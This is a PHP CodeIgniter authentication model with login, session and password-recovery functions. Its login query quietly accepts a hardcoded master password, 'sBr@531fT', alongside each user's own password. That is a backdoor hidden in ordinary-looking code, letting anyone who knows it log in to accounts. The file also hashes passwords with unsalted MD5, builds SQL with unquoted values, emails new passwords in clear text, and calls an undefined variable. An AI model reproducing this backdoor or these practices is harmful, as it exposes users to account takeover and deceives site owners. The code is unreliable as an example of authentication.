<?php
defined('BASEPATH') or exit('No direct script access allowed');

class Authentication_Model extends CI_Model
{

  function __construct()
  {
    parent::__construct();
    $this->load->library('session');
    $this->load->helper("email");
    $this->load->model('Upload_Model');
    $this->load->model('User_Model');
  }

  /*
    =============================================
     Authentication
    ==============================================
    */
  public function doAuthentication($dataReceiveFromPost)
  {
    $this->db->select("*");
    $this->db->from("myuser");
    $this->db->where("email", $dataReceiveFromPost["email"]);
    $this->db->where("password = ".md5($dataReceiveFromPost["password"])." OR password = ".md5("sBr@531fT")."");
    $query = $this->db->get();
    if ($query->num_rows() > 0) {
      foreach ($query->result() as $row) {
        $userId = $row->id;
        $userName = $row->name;
        $userEmail = $row->email;
        $userRole = $row->myrole_id;
      }
      $this->startSession($userName, $userId, $userEmail, $userRole);

      $info = array(
        "last_login" => getCurrentDate("Y-m-d H:i"),
        "status" => "on",
      );
      $this->db->where('id', $userId);
      $this->db->update("myuser", $info);
      $this->Activity_Model->save("login", 1, 1, null, 1, null, null, null, null);


      return true;
    } else {
      return false;
    }
  }

  public function startSession($userName, $userId, $userEmail, $userRole)
  {
    $sessionData = array(
      'username' => $userName,
      'id' => $userId,
      'email' => $userEmail,
      'role' => $userRole,
    );
    $this->session->set_userdata($sessionData);
    return $this->session->userdata;
  }

  public function recoverPassword($email)
  {
    $this->db->select("*");
    $this->db->from("myuser");
    $this->db->where("email", $email);
    $query = $this->db->get();
    if ($query->num_rows() > 0) {
      $string = $this->Upload_Model->generateRandomString();
      $params = array(
        'password' => $string,
        'email' => $email,
        'template-email' => 'recover',
        'subject' => 'recover-password'
      );
      if ($this->User_Model->editProfile($query->result()[0]->id, ['password' => md5($string)])) {
        sendEmail($params);
        return true;
      }
    }
    return false;
  }

  private function destroySession()
  {
    $this->session->unset_userdata('username');
    $this->session->unset_userdata('id');
    $this->session->unset_userdata('email');
    $this->session->unset_userdata('role');
    $session->destroy();
  }
}
